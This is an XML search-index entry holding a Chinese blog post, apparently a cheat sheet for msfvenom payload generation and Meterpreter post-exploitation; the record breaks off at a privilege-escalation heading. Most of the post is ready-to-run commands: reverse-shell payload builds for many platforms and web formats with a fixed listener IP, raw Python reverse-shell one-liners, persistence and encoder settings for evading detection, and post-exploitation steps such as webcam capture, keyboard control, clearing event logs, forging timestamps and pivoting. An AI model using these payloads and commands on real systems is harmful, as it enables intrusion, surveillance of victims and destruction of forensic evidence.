<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Msfvenmon常用命令/Meterpreter后渗透常用命令</title>
      <link href="2021/05/31/msfvenmon-chang-yong-ming-ling-meterpreter-hou-shen-tou-chang-yong-ming-ling/"/>
      <url>2021/05/31/msfvenmon-chang-yong-ming-ling-meterpreter-hou-shen-tou-chang-yong-ming-ling/</url>
      
        <content type="html"><![CDATA[<h1 id="Meterpreter后渗透常用命令"><a href="#Meterpreter后渗透常用命令" class="headerlink" title="Meterpreter后渗透常用命令"></a>Meterpreter后渗透常用命令</h1><span id="more"></span><h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1 前言"></a>1 前言</h2><p>Meterpreter是Metasploit框架中的一个扩展模块，作为溢出成功以后的攻击载荷使用，攻击载荷在溢出攻击成功以后给我们返回一个控制通道。使用它作为攻击载荷能够获得目标系统的一个Meterpreter shell的链接。Meterpreter shell作为渗透模块有很多有用的功能，比如添加一个用户、隐藏一些东西、打开shell、得到用户密码、上传下载远程主机的文件、运行cmd.exe、捕捉屏幕、得到远程控制权、捕获按键信息、清除应用程序、显示远程主机的系统信息、显示远程机器的网络接口和IP地址等信息。另外Meterpreter能够躲避入侵检测系统，在远程主机上隐藏自己，它不改变系统硬盘中的文件，因此HIDS[基于主机的入侵检测系统]很难对它做出响应。此外它在运行的时候系统时间是变化的，所以跟踪它或者终止它对于一个有经验的人也会变得非常困难</p><h2 id="2-文件目录解析"><a href="#2-文件目录解析" class="headerlink" title="2 文件目录解析"></a>2 文件目录解析</h2><p>核心文件包括data、modules、scripts、tools、plugins</p><h3 id="2-1-data"><a href="#2-1-data" class="headerlink" title="2.1 data"></a>2.1 data</h3><p>该文件常用功能在woldlist 里面</p><h3 id="2-2-modules"><a href="#2-2-modules" class="headerlink" title="2.2 modules"></a>2.2 modules</h3><p>该文件包含了msf最核心的几个文件</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">auxiliary #漏洞辅助模块一般是没有攻击载荷的漏洞攻击Exploit #渗透攻击模块st #开发模块pads #漏洞负载模块Encode #编码模块Nops #空指令模块<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-3-scripts"><a href="#2-3-scripts" class="headerlink" title="2.3 scripts"></a>2.3 scripts</h3><p>该文件夹里面包含各种脚本</p><h3 id="2-4-tools"><a href="#2-4-tools" class="headerlink" title="2.4 tools"></a>2.4 tools</h3><p>该文件夹中存放着大量的使用脚本</p><h3 id="2-5-plugins"><a href="#2-5-plugins" class="headerlink" title="2.5 plugins"></a>2.5 plugins</h3><p>该文件夹放着大量的插件</p><h2 id="3-生成木马模块"><a href="#3-生成木马模块" class="headerlink" title="3 生成木马模块"></a>3 生成木马模块</h2><h3 id="3-1-常用参数"><a href="#3-1-常用参数" class="headerlink" title="3.1 常用参数"></a>3.1 常用参数</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">-p # –payload &lt; payload&gt; 指定需要使用的payload(攻击荷载)。也可以使用自定义payload,几乎是支持全平台的-l # –list [module_type] 列出指定模块的所有可用资源. 模块类型包括: payloads, encoders, nops, all -n # –nopsled &lt; length&gt; 为payload预先指定一个NOP滑动长度-f # –format &lt; format&gt; 指定输出格式 (使用 –help-formats 来获取msf支持的输出格式列表)-e, #–encoder [encoder] 指定需要使用的encoder(编码器),指定需要使用的编码，如果既没用-e选项也没用-b选项，则输出raw payload -a # –arch &lt; architecture&gt; 指定payload的目标架构，例如x86 | x64 | x86_64-–platform &lt; platform&gt; 指定payload的目标平台-s #–space &lt; length&gt; 设定有效攻击荷载的最大长度，就是文件大小-b, #–bad-chars &lt; list&gt; 设定规避字符集，指定需要过滤的坏字符例如:不使用 &#39;\x0f&#39;、&#39;\x00&#39;; -i # –iterations &lt; count&gt; 指定payload的编码次数-c #–add-code &lt; path&gt; 指定一个附加的win32 shellcode文件-x #–template &lt; path&gt; 指定一个自定义的可执行文件作为模板,并将payload嵌入其中-k #–keep 保护模板程序的动作，注入的payload作为一个新的进程运行 –payload-options 列举payload的标准选项-o # –out &lt; path&gt; 指定创建好的payload的存放位置-v #–var-name &lt; name&gt; 指定一个自定义的变量，以确定输出格式 –shellest 最小化生成payload-h  # –help 查看帮助选项–help-formats #查看msf支持的输出格式列表# ⽐如想查看 windows&#x2F;meterpreter&#x2F;reverse_tcp 支持什什么平台、哪些选项，可以使⽤ msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp --list- options<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-2-几个重要的监听参数"><a href="#3-2-几个重要的监听参数" class="headerlink" title="3.2 几个重要的监听参数"></a>3.2 几个重要的监听参数</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">#防止假session 在实际使用中，会遇到假session 或者刚链接就断开的情况，补充一些参数，防止假死与假session msf exploit(multi&#x2F;handler) &gt; set ExitOnSession false &#x2F;&#x2F;可以在接收到seesion后继续监听端口，保持侦听。#防止session 意外退出msf5 exploit(multi&#x2F;handler) &gt; set SessionCommunicationTimeout 0 &#x2F;&#x2F;默认情况下，如果一个会话将在5分钟(300秒)没有任何活动，那么它会被杀死,为防止此情况可将此项修改为0msf5 exploit(multi&#x2F;handler) &gt; set SessionExpirationTimeout 0 &#x2F;&#x2F;默认情况下，一个星期(604800秒)后，会话将被强制关闭,修改为0可永久不会被关闭<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-3-handler-后台持续监听"><a href="#3-3-handler-后台持续监听" class="headerlink" title="3.3 handler 后台持续监听"></a>3.3 handler 后台持续监听</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">msf exploit(multi&#x2F;handler) &gt; exploit -j -z#使⽤用 exploit -j -z 可在后台持续监听,-j为后台任务，-z为成功后不不主动发送stage，使⽤用Jobs命令查看和管理理后台任 务。 jobs -K 可结束所有任务。#快捷建立监听方式msf5 &gt; handler -H 192.177.113.87 -P 4444 -p windows&#x2F;meterpreter&#x2F;reverse_tcp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-4-payload-可持续化"><a href="#3-4-payload-可持续化" class="headerlink" title="3.4 payload 可持续化"></a>3.4 payload 可持续化</h3><p>一般来说使用，msfvenom 生成的payload会单独开启一个进程，这种进程很容易被发现和关闭，在后期想做持久化的时候只能再使用migrate</p><p>通过生成payload时使用如下命令，payload会直接注入指定进程</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.177.113.87 LPORT&#x3D;4444 -e x86&#x2F;shikata_ga_nai -b &quot;\x00&quot; -i 5 -a x86 --platform win PrependMigrate&#x3D;ture PrependMigrateProc&#x3D;svchost.exe -f exe -o shell.exe #⽣成的shell程序执⾏后会启动两个进程 shell.exe 和 svchost.exe ，关闭其中一个不会影响会话状态。唯一美中不足的是 svchost.exe 不是 system32 目录下的。#1.PrependMigrate&#x3D;true PrependMigrateProc&#x3D;svchost.exe 使这个程序默认会迁移到svchost.exe进程，⾃己测试的时候不不建议到这个进程⽽是其他的持久进程#2.使⽤用-p指定使⽤用的攻击载荷模块，使⽤用-e指定使⽤用x86&#x2F;shikata_ga_nai编码器器，使⽤用-f选项告诉MSF编码器器输出格式为exe，-o选项指定输出的文件名为payload.exe，保存在根目录下<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-2-各平台payload-生成"><a href="#3-2-各平台payload-生成" class="headerlink" title="3.2 各平台payload 生成"></a>3.2 各平台payload 生成</h3><h4 id="3-2-1-windows"><a href="#3-2-1-windows" class="headerlink" title="3.2.1 windows"></a>3.2.1 windows</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.177.113.87 LPORT&#x3D;4444 -a x86 --platform Windows -f exe &gt;shell.exemsfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.177.113.87 LPORT&#x3D;4444 -f exe &gt;shell.exe#注意：windows下⽣生成32位&#x2F;64位payload时需要注意:以windows&#x2F;meterpreter&#x2F;reverse_tcp为例例，该payload默认为32位，也可使⽤-a x86选项指定。如果要生成64位，则payload为windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="3-2-2-Linux"><a href="#3-2-2-Linux" class="headerlink" title="3.2.2 Linux"></a>3.2.2 Linux</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">msfvenom -p linux&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.177.113.87 LPORT&#x3D;4444 -a x86 --platform Linux -f elf &gt;shell.elf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="3-2-3-Mac"><a href="#3-2-3-Mac" class="headerlink" title="3.2.3 Mac"></a>3.2.3 Mac</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">msfvenom -p osx&#x2F;x86&#x2F;shell_reverse_tcp LHOST&#x3D;192.177.113.87 LPORT&#x3D;4444 -f -a x86 --platform osx -f macho &gt;shell.macho<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="3-2-4-Android"><a href="#3-2-4-Android" class="headerlink" title="3.2.4 Android"></a>3.2.4 Android</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">msfvenom -a dalvik -p android&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.177.113.87 LPORT&#x3D;4444 -f raw &gt;shell.apkmsfvenom -p android&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.177.113.87 R&gt;shell.apk<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="3-2-5-Powershell"><a href="#3-2-5-Powershell" class="headerlink" title="3.2.5 Powershell"></a>3.2.5 Powershell</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">msfvenom -a x86 -platform windows -p windows&#x2F;poweshell_reverse_tcp LHOST&#x3D;192.177.113.87 LPORT&#x3D;4444 -e cmd&#x2F;powershell_base -f raw -o shell.ps1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="3-2-6-Netcat"><a href="#3-2-6-Netcat" class="headerlink" title="3.2.6 Netcat"></a>3.2.6 Netcat</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">#nc 正向链接msfvenom -p windows&#x2F;shell_hidden_bind_tcp LHOST&#x3D;192.177.113.87 LPORT&#x3D;4444 -f exe &gt;shell.exe#nc 反向连接msfvenom -p windows&#x2F;shell_reverse_tcp LHOST&#x3D;192.177.113.87 LPORT&#x3D;4444 -f exe &gt;shell.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="3-2-7-基于Linux的shellcode"><a href="#3-2-7-基于Linux的shellcode" class="headerlink" title="3.2.7 基于Linux的shellcode"></a>3.2.7 基于Linux的shellcode</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">msfvenom -p linux&#x2F;x86&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.177.113.87 LPORT&#x3D;4444 -a x86 --platform linux -f c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="3-2-8-基于Windows的shellcode"><a href="#3-2-8-基于Windows的shellcode" class="headerlink" title="3.2.8 基于Windows的shellcode"></a>3.2.8 基于Windows的shellcode</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.177.113.87 LPORT&#x3D;4444 -a x86 --platform windows -f c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="3-2-9-基于MAC的shellcode"><a href="#3-2-9-基于MAC的shellcode" class="headerlink" title="3.2.9 基于MAC的shellcode"></a>3.2.9 基于MAC的shellcode</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">msfvemom -p osx&#x2F;x86&#x2F;shell_reverse_tcp LHOST&#x3D;192.177.113.87 LPORT&#x3D;4444 -a x86 --platform osx -f c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="3-2-10-Python-反弹shell"><a href="#3-2-10-Python-反弹shell" class="headerlink" title="3.2.10 Python 反弹shell"></a>3.2.10 Python 反弹shell</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">msfvenom -p cmd&#x2F;unix&#x2F;reverse_python LHOST&#x3D;192.177.113.87 LPORT&#x3D;4444 -f raw&gt;shell.pymsfvenom -a python -p python&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.177.113.87 LPORT&#x3D;4444 -f raw &gt;shell.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="3-2-11-Python正向shell"><a href="#3-2-11-Python正向shell" class="headerlink" title="3.2.11 Python正向shell"></a>3.2.11 Python正向shell</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">#1.python&#x2F;python3 -c python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.177.113.87&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;bash&quot;,&quot;-i&quot;]);&#39;#2.python&#x2F;python3 -c &quot;exec(\&quot;import socket, subprocess;s &#x3D; socket.socket();s.connect((&quot;192.177.113.87&quot;,3333))\n while 1: proc &#x3D; subprocess.Popen(s.recv(1024), shell&#x3D;True, stdout&#x3D;subprocess.PIPE, stderr&#x3D;subprocess.PIPE, stdin&#x3D;subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\&quot;)&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="3-2-12-Bash"><a href="#3-2-12-Bash" class="headerlink" title="3.2.12 Bash"></a>3.2.12 Bash</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">msfvenom -p cmd&#x2F;unix&#x2F;reverse_bash LHOST&#x3D;192.177.113.87 LPORT&#x3D;4444 -f raw &gt; shell.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="3-2-13-Perl"><a href="#3-2-13-Perl" class="headerlink" title="3.2.13 Perl"></a>3.2.13 Perl</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">msfvenom -p cmd&#x2F;unix&#x2F;reverse_perl LHOST&#x3D;192.177.113.87 LPORT&#x3D;4444 -f raw &gt; shell.pl<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="3-2-14-Lua"><a href="#3-2-14-Lua" class="headerlink" title="3.2.14 Lua"></a>3.2.14 Lua</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">msfvenom -p cmd&#x2F;unix&#x2F;reverse_lua LHOST&#x3D;192.177.113.87 LPORT&#x3D;4444 -f raw &gt; shell.lua<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-2-15-Ruby"><a href="#3-2-15-Ruby" class="headerlink" title="3.2.15 Ruby"></a>3.2.15 Ruby</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">msfvenom -p ruby&#x2F;shell_reverse_tcp LHOST&#x3D;192.177.113.87 LPORT&#x3D;4444 -f raw &gt; shell.rb<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="3-2-16-Web"><a href="#3-2-16-Web" class="headerlink" title="3.2.16 Web"></a>3.2.16 Web</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">#PHPmsfvenom -p php&#x2F;meterpreter_reverse_tcp LHOST&#x3D;10.211.55.2 LPORT&#x3D;3333 -f raw &gt; shell.php cat shell.php | pbcopy &amp;&amp; echo &#39;&lt;?php &#39; | tr -d &#39;\n&#39; &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php#ASPXmsfvenom -a x86 --platform windows -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;10.211.55.2 LPORT&#x3D;3333 -f aspx -o shell.aspx#ASPmsfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;10.211.55.2 LPORT&#x3D;3333 -f asp &gt; shell.asp#JSPmsfvenom -p java&#x2F;jsp_shell_reverse_tcp LHOST&#x3D;10.211.55.2 LPORT&#x3D;3333 -f raw &gt; shell.jsp#WARmsfvenom -p java&#x2F;jsp_shell_reverse_tcp LHOST&#x3D;10.211.55.2 LPORT&#x3D;3333 -f war &gt; shell.war#nodejsmsfvenom -p nodejs&#x2F;shell_reverse_tcp LHOST&#x3D;10.211.55.2 LPORT&#x3D;3333 -f raw -o shell.js<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="4-系统命令"><a href="#4-系统命令" class="headerlink" title="4 系统命令"></a>4 系统命令</h2><h3 id="4-1-基础系统命令"><a href="#4-1-基础系统命令" class="headerlink" title="4.1 基础系统命令"></a>4.1 基础系统命令</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">search #查找漏洞利用模块use &lt;name&gt; #使用指定模块show options #显示所有配置信息session -s &lt;ID&gt; # 进入会话。- K 杀死会话background  #当前会话放置后台run #执行。run后按下俩下 tab，列出已有脚本info #查看已有模块信息getuid #查看权限getpid #查看当前进程的pidsysinfo #查看目标主机系统信息ps #查看当前活跃进程 kill &lt;PId&gt; 杀死进程idletime #查看目标计算机闲置时间reboot &#x2F; shutdown  #重启&#x2F;关机shell #进入目标 cmd shel<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-2-开关键盘-鼠标"><a href="#4-2-开关键盘-鼠标" class="headerlink" title="4.2 开关键盘/鼠标"></a>4.2 开关键盘/鼠标</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">uictl [enable&#x2F;disable] [keyboard&#x2F;mouse&#x2F;all] #开启或禁止键盘&#x2F;鼠标<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="4-3-摄像头命令"><a href="#4-3-摄像头命令" class="headerlink" title="4.3 摄像头命令"></a>4.3 摄像头命令</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">webcam_list  #查看摄像头webcam_snap   #通过摄像头拍照webcam_stream   #通过摄像头开启视频<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="4-4-执行文件"><a href="#4-4-执行文件" class="headerlink" title="4.4 执行文件"></a>4.4 执行文件</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">meterpreter &gt; execute Usage: execute -f file [options]Executes a command on the remote machine.OPTIONS:    -H        Create the process hidden from view.    -a &lt;opt&gt;  The arguments to pass to the command.    -c        Channelized I&#x2F;O (required for interaction).    -d &lt;opt&gt;  The &#39;dummy&#39; executable to launch when using -m.    -f &lt;opt&gt;  The executable command to run.    -h        Help menu.    -i        Interact with the process after creating it.    -k        Execute process on the meterpreters current desktop    -m        Execute from memory.    -s &lt;opt&gt;  Execute process in a given session as the session user    -t        Execute process with currently impersonated thread token<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>例：</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">execute -H -i -f cmd.exe # 创建新进程cmd.exe，-H不可见，-i交互<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="4-5-进程迁移"><a href="#4-5-进程迁移" class="headerlink" title="4.5 进程迁移"></a>4.5 进程迁移</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">meterpreter &gt; migrateUsage: migrate &lt;&lt;pid&gt; | -P &lt;pid&gt; | -N &lt;name&gt;&gt; [-t timeout]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>例：</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">getpid    # 获取当前进程的pidps   # 查看当前活跃进程migrate &lt;pid值&gt;    #将Meterpreter会话移植到指定pid值进程中kill &lt;pid值&gt;   #杀死进程注意 只有相同进程权限的启动程序可以注入<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-5-日志清理"><a href="#4-5-日志清理" class="headerlink" title="4.5 日志清理"></a>4.5 日志清理</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">clearev #清除windows中的应用程序日志、系统日志、安全日志，需要管理员权限<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="4-6-基础文件系统命令"><a href="#4-6-基础文件系统命令" class="headerlink" title="4.6 基础文件系统命令"></a>4.6 基础文件系统命令</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">getwd 或者pwd # 查看当前工作目录  lscdcat c:\\lltest\\lltestpasswd.txt  # 查看文件内容upload &#x2F;tmp&#x2F;hack.txt C:\\lltest  # 上传文件到目标机上download c:\\lltest\\lltestpasswd.txt &#x2F;tmp&#x2F; # 下载文件到本机上edit c:\\1.txt #编辑或创建文件  没有的话，会新建文件rm C:\\lltest\\hack.txtmkdir lltest2  #只能在当前目录下创建文件夹rmdir lltest2  #只能删除当前目录下文件夹getlwd   或者 lpwd   #操作攻击者主机 查看当前目录lcd &#x2F;tmp   #操作攻击者主机 切换目录<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-7-伪造时间戳"><a href="#4-7-伪造时间戳" class="headerlink" title="4.7 伪造时间戳"></a>4.7 伪造时间戳</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">meterpreter &gt; timestomp c:&#x2F;&#x2F;Usage: timestomp &lt;file(s)&gt; OPTIONSOPTIONS:    -a &lt;opt&gt;  #设置文件的“上次访问”时间    -b        #设置MACE时间戳，使EnCase显示空白    -c &lt;opt&gt;  #设置文件的“创建”时间    -e &lt;opt&gt;  #设置文件的“mft entry modified”时间    -f &lt;opt&gt;  #将属性的MACE设置为与提供的文件相同    -h        Help banner    -m &lt;opt&gt;  #设置文件的“上次写入”时间    -r        #在目录上递归设置MACE时间戳    -v        #显示文件的UTC MACE值    -z &lt;opt&gt;  #设置文件的所有四个属性（MACE）例：timestomp -v C:&#x2F;&#x2F;2.txt   #查看时间戳timestomp C:&#x2F;&#x2F;2.txt -f C:&#x2F;&#x2F;1.txt #将1.txt的时间戳复制给2.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-8-搜索文件"><a href="#4-8-搜索文件" class="headerlink" title="4.8 搜索文件"></a>4.8 搜索文件</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">meterpreter &gt; search -hUsage: search [-d dir] [-r recurse] -f pattern [-f pattern]...Search for files.OPTIONS:    -d &lt;opt&gt;  #开始搜索的目录&#x2F;驱动器。留空以搜索所有驱动器(默认值：）    -f &lt;opt&gt;  #要搜索的文件模式glob(e、 g.*秘密*.doc？）    -h        Help Banner    -r &lt;opt&gt;  #递归搜索子目录(默认值：true）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-9-网络命令"><a href="#4-9-网络命令" class="headerlink" title="4.9 网络命令"></a>4.9 网络命令</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">ipconfig&#x2F;ifconfignetstat –anoarpgetproxy   #查看代理信息route   #查看路由<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-10-端口转发"><a href="#4-10-端口转发" class="headerlink" title="4.10 端口转发"></a>4.10 端口转发</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">meterpreter &gt; portfwd -hUsage: portfwd [-h] [add | delete | list | flush] [args]OPTIONS:    -L &lt;opt&gt;  #转发：要侦听的本地主机（可选）。反向：要连接的本地主机。    -R        #表示反向端口正向。    -h        Help banner.    -i &lt;opt&gt;  #要与之交互的端口转发条目的索引（请参阅“list”命令）。    -l &lt;opt&gt;  #转发：要侦听的本地端口。反向：要连接的本地端口    -p &lt;opt&gt;  #转发：要连接的远程端口。反向：监听的远程端口。    -r &lt;opt&gt;  #转发：要连接到的远程主机。例：portfwd add -l 6666 -p 3389 -r 127.0.0.1#将目标机的3389端口转发到本地6666端口<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-11-添加路由"><a href="#4-11-添加路由" class="headerlink" title="4.11 添加路由"></a>4.11 添加路由</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">meterpreter &gt; run autoroute -h[!] Meterpreter scripts are deprecated. Try post&#x2F;multi&#x2F;manage&#x2F;autoroute.[!] Example: run post&#x2F;multi&#x2F;manage&#x2F;autoroute OPTION&#x3D;value [...][*] Usage:   run autoroute [-r] -s subnet -n netmask[*] Examples:[*]   run autoroute -s 10.1.1.0 -n 255.255.255.0  # Add a route to 10.10.10.1&#x2F;255.255.255.0[*]   run autoroute -s 10.10.10.1                 # Netmask defaults to 255.255.255.0[*]   run autoroute -s 10.10.10.1&#x2F;24              # CIDR notation is also okay[*]   run autoroute -p                            # Print active routing table[*]   run autoroute -d -s 10.10.10.1              # Deletes the 10.10.10.1&#x2F;255.255.255.0 route[*] Use the &quot;route&quot; and &quot;ipconfig&quot; Meterpreter commands to learn about available routes例：run autoroute -s 192.168.159.0&#x2F;24  #添加到目标环境网络run autoroute –p  #查看添加的路由#利用arp_scanner\portscan 进行扫描run post&#x2F;windows&#x2F;gather&#x2F;arp_scanner RHOSTS&#x3D;run auxiliary&#x2F;scanner&#x2F;portscan&#x2F;tcp RHOSTS&#x3D;  PORTS&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-12-Socks4a代理"><a href="#4-12-Socks4a代理" class="headerlink" title="4.12 Socks4a代理"></a>4.12 Socks4a代理</h3><p><code>autoroute</code>添加完路由后，还可以利用<strong>msf</strong>自带的<code>sock4a</code>模块进行<code>Socks4a</code>代理</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">msf&gt; use auxiliary&#x2F;server&#x2F;socks4a msf &gt; set srvhost 127.0.0.1msf &gt; set srvport 1080msf &gt; runvi &#x2F;etc&#x2F;proxychains.conf #添加 socks4 127.0.0.1 1080<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-13-信息收集"><a href="#4-13-信息收集" class="headerlink" title="4.13 信息收集"></a>4.13 信息收集</h3><p>位置：</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;modules&#x2F;post&#x2F;windows&#x2F;gather&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;modules&#x2F;post&#x2F;linux&#x2F;gather#常用脚本run post&#x2F;windows&#x2F;gather&#x2F;checkvm #是否虚拟机run post&#x2F;linux&#x2F;gather&#x2F;checkvm #是否虚拟机run post&#x2F;windows&#x2F;gather&#x2F;forensics&#x2F;enum_drives #查看分区run post&#x2F;windows&#x2F;gather&#x2F;enum_applications #获取安装软件信息run post&#x2F;windows&#x2F;gather&#x2F;dumplinks   #获取最近的文件操作run post&#x2F;windows&#x2F;gather&#x2F;enum_ie  #获取IE缓存run post&#x2F;windows&#x2F;gather&#x2F;enum_chrome   #获取Chrome缓存run post&#x2F;windows&#x2F;gather&#x2F;enum_patches  #补丁信息run post&#x2F;windows&#x2F;gather&#x2F;enum_domain  #查找域控<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-14-提权"><a href="#4-14-提权" class="headerlink" title="4.14 提权"></a>4.14 提权</h3><h4 id="4-14-1-getsystem"><a href="#4-14-1-getsystem" class="headerlink" title="4.14.1 getsystem"></a>4.14.1 getsystem</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">getsystem<span aria-hidden="true" 